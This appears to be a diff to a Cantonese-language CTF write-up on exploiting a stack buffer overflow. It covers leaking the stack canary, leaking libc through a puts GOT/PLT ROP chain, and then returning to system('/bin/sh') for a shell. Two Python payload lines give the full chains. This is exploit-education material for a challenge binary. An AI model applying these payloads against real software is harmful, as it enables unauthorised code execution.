@@ -88,8 +88,33 @@ asm code:
 
 leak canary payload= payload='b'*167+'a'+'g'
 
-只要將leak到嘅canary減0x67,就等於canary number
+只要將leak到嘅canary減0x67(g),就等於canary number
+
+下一步就係leak libc address..
+
+係之前d測試,除左發現會print多左8個位之外,我仲發現只要寫爛左canary,一禁exit 就可以stack check fail,姐係代表我地可以用exit return去其他return address,只要我地拎到canary, return address 就任我地寫
+
+由於有nx,所以只可以rop return to libc解決
+
+由於係x64,x64有calling convention,puts係讀rdi嘅parameters,所以就一個pop_rdi_ret gadget mov puts or whatever got 入去,puts_plt print
+
+Print 完再彈返去main
+
+full gadget= pop_rdi_ret+PUTSGOT+PUTSPLT+main
+
+```python
+
+payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(PUTSGOT)+p64(PUTSPLT)+p64(main)
+
+```
 
 
+呢到要注意一樣野,main係要跳返去initial variable個部份,不過因為個process冇熄過,所以canary同libcbase係唔會改
 
+拎晒libc_base 之後,加返d offset,係入buffer個個位入:
 
+```python
+payload='b'*167+'a'+p64(canary)+"\x90"*8+p64(pop_rdi_ret)+p64(libc_bin_sh)+p64(system)+p64(main)
+
+```
+exit 彈shell 
